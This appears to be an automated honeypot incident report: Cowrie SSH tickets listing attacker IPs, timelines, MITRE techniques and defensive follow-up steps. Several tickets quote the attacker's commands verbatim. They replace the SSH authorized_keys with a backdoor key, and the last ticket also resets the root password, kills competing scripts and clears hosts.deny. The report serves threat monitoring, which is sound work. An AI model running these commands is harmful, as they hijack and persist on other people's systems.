### 🔴 HIGH · IR-cdcfd04009b0

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:20 |
| **Last Seen** | 2026-05-13 16:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:20:27` | `cowrie.session.connect` |
| `2026-05-13 16:20:27` | `cowrie.client.version` |
| `2026-05-13 16:20:27` | `cowrie.client.kex` |
| `2026-05-13 16:20:28` | `cowrie.login.success` |
| `2026-05-13 16:20:28` | `cowrie.session.params` |
| `2026-05-13 16:20:28` | `cowrie.command.input` |
| `2026-05-13 16:20:28` | `cowrie.command.failed` |
| `2026-05-13 16:20:28` | `cowrie.log.closed` |
| `2026-05-13 16:20:29` | `cowrie.session.params` |
| `2026-05-13 16:20:29` | `cowrie.command.input` |
| `2026-05-13 16:20:29` | `cowrie.session.file_download` |
| `2026-05-13 16:20:29` | `cowrie.log.closed` |
| `2026-05-13 16:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c229e2d6fe

| Field | Detail |
|---|---|
| **Source IP** | `195.250.72[.]168` |
| **First Seen** | 2026-05-13 16:20 |
| **Last Seen** | 2026-05-13 16:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:20:31` | `cowrie.session.connect` |
| `2026-05-13 16:20:31` | `cowrie.client.version` |
| `2026-05-13 16:20:31` | `cowrie.client.kex` |
| `2026-05-13 16:20:32` | `cowrie.login.success` |
| `2026-05-13 16:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.250.72[.]168` to AbuseIPDB if not already reported
- [ ] Block `195.250.72[.]168` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4f27c91d44f

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:23 |
| **Last Seen** | 2026-05-13 16:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:23:39` | `cowrie.session.connect` |
| `2026-05-13 16:23:39` | `cowrie.client.version` |
| `2026-05-13 16:23:39` | `cowrie.client.kex` |
| `2026-05-13 16:23:39` | `cowrie.login.success` |
| `2026-05-13 16:23:39` | `cowrie.session.params` |
| `2026-05-13 16:23:39` | `cowrie.command.input` |
| `2026-05-13 16:23:39` | `cowrie.command.failed` |
| `2026-05-13 16:23:39` | `cowrie.log.closed` |
| `2026-05-13 16:23:39` | `cowrie.session.params` |
| `2026-05-13 16:23:39` | `cowrie.command.input` |
| `2026-05-13 16:23:39` | `cowrie.session.file_download` |
| `2026-05-13 16:23:39` | `cowrie.log.closed` |
| `2026-05-13 16:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1d852384b5

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:23 |
| **Last Seen** | 2026-05-13 16:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:23:40` | `cowrie.session.connect` |
| `2026-05-13 16:23:41` | `cowrie.client.version` |
| `2026-05-13 16:23:41` | `cowrie.client.kex` |
| `2026-05-13 16:23:41` | `cowrie.login.success` |
| `2026-05-13 16:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-143ab3d2ad93

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:28 |
| **Last Seen** | 2026-05-13 16:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:28:02` | `cowrie.session.connect` |
| `2026-05-13 16:28:02` | `cowrie.client.version` |
| `2026-05-13 16:28:02` | `cowrie.client.kex` |
| `2026-05-13 16:28:02` | `cowrie.login.success` |
| `2026-05-13 16:28:03` | `cowrie.session.params` |
| `2026-05-13 16:28:03` | `cowrie.command.input` |
| `2026-05-13 16:28:03` | `cowrie.command.failed` |
| `2026-05-13 16:28:03` | `cowrie.log.closed` |
| `2026-05-13 16:28:03` | `cowrie.session.params` |
| `2026-05-13 16:28:03` | `cowrie.command.input` |
| `2026-05-13 16:28:03` | `cowrie.session.file_download` |
| `2026-05-13 16:28:03` | `cowrie.log.closed` |
| `2026-05-13 16:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-028570bb337e

| Field | Detail |
|---|---|
| **Source IP** | `122.161.46[.]192` |
| **First Seen** | 2026-05-13 16:28 |
| **Last Seen** | 2026-05-13 16:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:28:04` | `cowrie.session.connect` |
| `2026-05-13 16:28:04` | `cowrie.client.version` |
| `2026-05-13 16:28:04` | `cowrie.client.kex` |
| `2026-05-13 16:28:04` | `cowrie.login.success` |
| `2026-05-13 16:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.161.46[.]192` to AbuseIPDB if not already reported
- [ ] Block `122.161.46[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d5485eb6008

| Field | Detail |
|---|---|
| **Source IP** | `125.77.133[.]94` |
| **First Seen** | 2026-05-13 16:35 |
| **Last Seen** | 2026-05-13 16:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:35:04` | `cowrie.session.connect` |
| `2026-05-13 16:35:04` | `cowrie.client.version` |
| `2026-05-13 16:35:04` | `cowrie.client.kex` |
| `2026-05-13 16:35:05` | `cowrie.login.success` |
| `2026-05-13 16:35:05` | `cowrie.session.params` |
| `2026-05-13 16:35:05` | `cowrie.command.input` |
| `2026-05-13 16:35:05` | `cowrie.command.failed` |
| `2026-05-13 16:35:05` | `cowrie.log.closed` |
| `2026-05-13 16:35:06` | `cowrie.session.params` |
| `2026-05-13 16:35:06` | `cowrie.command.input` |
| `2026-05-13 16:35:06` | `cowrie.session.file_download` |
| `2026-05-13 16:35:06` | `cowrie.log.closed` |
| `2026-05-13 16:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.77.133[.]94` to AbuseIPDB if not already reported
- [ ] Block `125.77.133[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be8eade4b6de

| Field | Detail |
|---|---|
| **Source IP** | `125.77.133[.]94` |
| **First Seen** | 2026-05-13 16:35 |
| **Last Seen** | 2026-05-13 16:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:35:08` | `cowrie.session.connect` |
| `2026-05-13 16:35:08` | `cowrie.client.version` |
| `2026-05-13 16:35:08` | `cowrie.client.kex` |
| `2026-05-13 16:35:09` | `cowrie.login.success` |
| `2026-05-13 16:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.77.133[.]94` to AbuseIPDB if not already reported
- [ ] Block `125.77.133[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b673ee8d8c32

| Field | Detail |
|---|---|
| **Source IP** | `202.145.0[.]18` |
| **First Seen** | 2026-05-13 16:35 |
| **Last Seen** | 2026-05-13 16:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:35:20` | `cowrie.session.connect` |
| `2026-05-13 16:35:20` | `cowrie.client.version` |
| `2026-05-13 16:35:20` | `cowrie.client.kex` |
| `2026-05-13 16:35:20` | `cowrie.login.success` |
| `2026-05-13 16:35:21` | `cowrie.session.params` |
| `2026-05-13 16:35:21` | `cowrie.command.input` |
| `2026-05-13 16:35:21` | `cowrie.command.failed` |
| `2026-05-13 16:35:21` | `cowrie.log.closed` |
| `2026-05-13 16:35:21` | `cowrie.session.params` |
| `2026-05-13 16:35:21` | `cowrie.command.input` |
| `2026-05-13 16:35:21` | `cowrie.session.file_download` |
| `2026-05-13 16:35:21` | `cowrie.log.closed` |
| `2026-05-13 16:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.145.0[.]18` to AbuseIPDB if not already reported
- [ ] Block `202.145.0[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e35dfc3ed10c

| Field | Detail |
|---|---|
| **Source IP** | `202.145.0[.]18` |
| **First Seen** | 2026-05-13 16:35 |
| **Last Seen** | 2026-05-13 16:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:35:23` | `cowrie.session.connect` |
| `2026-05-13 16:35:23` | `cowrie.client.version` |
| `2026-05-13 16:35:23` | `cowrie.client.kex` |
| `2026-05-13 16:35:23` | `cowrie.login.success` |
| `2026-05-13 16:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.145.0[.]18` to AbuseIPDB if not already reported
- [ ] Block `202.145.0[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77abb499c174

| Field | Detail |
|---|---|
| **Source IP** | `193.39.208[.]26` |
| **First Seen** | 2026-05-13 16:36 |
| **Last Seen** | 2026-05-13 16:36 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:36:53` | `cowrie.session.connect` |
| `2026-05-13 16:36:53` | `cowrie.client.version` |
| `2026-05-13 16:36:54` | `cowrie.client.kex` |
| `2026-05-13 16:36:54` | `cowrie.login.success` |
| `2026-05-13 16:36:55` | `cowrie.session.params` |
| `2026-05-13 16:36:55` | `cowrie.command.input` |
| `2026-05-13 16:36:55` | `cowrie.command.failed` |
| `2026-05-13 16:36:55` | `cowrie.log.closed` |
| `2026-05-13 16:36:55` | `cowrie.session.params` |
| `2026-05-13 16:36:55` | `cowrie.command.input` |
| `2026-05-13 16:36:55` | `cowrie.session.file_download` |
| `2026-05-13 16:36:55` | `cowrie.log.closed` |
| `2026-05-13 16:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.39.208[.]26` to AbuseIPDB if not already reported
- [ ] Block `193.39.208[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c60a8c07f637

| Field | Detail |
|---|---|
| **Source IP** | `193.39.208[.]26` |
| **First Seen** | 2026-05-13 16:36 |
| **Last Seen** | 2026-05-13 16:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:36:57` | `cowrie.session.connect` |
| `2026-05-13 16:36:57` | `cowrie.client.version` |
| `2026-05-13 16:36:57` | `cowrie.client.kex` |
| `2026-05-13 16:36:58` | `cowrie.login.success` |
| `2026-05-13 16:36:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.39.208[.]26` to AbuseIPDB if not already reported
- [ ] Block `193.39.208[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf2371576614

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]132` |
| **First Seen** | 2026-05-13 16:38 |
| **Last Seen** | 2026-05-13 16:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:38:41` | `cowrie.session.connect` |
| `2026-05-13 16:38:41` | `cowrie.client.version` |
| `2026-05-13 16:38:42` | `cowrie.client.kex` |
| `2026-05-13 16:38:43` | `cowrie.login.success` |
| `2026-05-13 16:38:44` | `cowrie.session.params` |
| `2026-05-13 16:38:44` | `cowrie.command.input` |
| `2026-05-13 16:38:44` | `cowrie.command.failed` |
| `2026-05-13 16:38:44` | `cowrie.log.closed` |
| `2026-05-13 16:38:45` | `cowrie.session.params` |
| `2026-05-13 16:38:45` | `cowrie.command.input` |
| `2026-05-13 16:38:45` | `cowrie.session.file_download` |
| `2026-05-13 16:38:45` | `cowrie.log.closed` |
| `2026-05-13 16:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]132` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]132` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-353b3a9c0f8b

| Field | Detail |
|---|---|
| **Source IP** | `129.222.203[.]132` |
| **First Seen** | 2026-05-13 16:38 |
| **Last Seen** | 2026-05-13 16:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:38:49` | `cowrie.session.connect` |
| `2026-05-13 16:38:49` | `cowrie.client.version` |
| `2026-05-13 16:38:49` | `cowrie.client.kex` |
| `2026-05-13 16:38:51` | `cowrie.login.success` |
| `2026-05-13 16:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.222.203[.]132` to AbuseIPDB if not already reported
- [ ] Block `129.222.203[.]132` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c117fffccdfa

| Field | Detail |
|---|---|
| **Source IP** | `181.0.214[.]136` |
| **First Seen** | 2026-05-13 16:40 |
| **Last Seen** | 2026-05-13 16:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:40:30` | `cowrie.session.connect` |
| `2026-05-13 16:40:30` | `cowrie.client.version` |
| `2026-05-13 16:40:31` | `cowrie.client.kex` |
| `2026-05-13 16:40:32` | `cowrie.login.success` |
| `2026-05-13 16:40:33` | `cowrie.session.params` |
| `2026-05-13 16:40:33` | `cowrie.command.input` |
| `2026-05-13 16:40:33` | `cowrie.command.failed` |
| `2026-05-13 16:40:34` | `cowrie.log.closed` |
| `2026-05-13 16:40:34` | `cowrie.session.params` |
| `2026-05-13 16:40:34` | `cowrie.command.input` |
| `2026-05-13 16:40:34` | `cowrie.session.file_download` |
| `2026-05-13 16:40:34` | `cowrie.log.closed` |
| `2026-05-13 16:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.0.214[.]136` to AbuseIPDB if not already reported
- [ ] Block `181.0.214[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d64122118359

| Field | Detail |
|---|---|
| **Source IP** | `181.0.214[.]136` |
| **First Seen** | 2026-05-13 16:40 |
| **Last Seen** | 2026-05-13 16:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-13 16:40:42` | `cowrie.session.connect` |
| `2026-05-13 16:40:42` | `cowrie.client.version` |
| `2026-05-13 16:40:42` | `cowrie.client.kex` |
| `2026-05-13 16:40:44` | `cowrie.login.success` |
| `2026-05-13 16:40:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.0.214[.]136` to AbuseIPDB if not already reported
- [ ] Block `181.0.214[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70ab9f204aa6

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-05-13 16:46 |
| **Last Seen** | 2026-05-13 16:46 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:qfqjJuSvNIO2"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
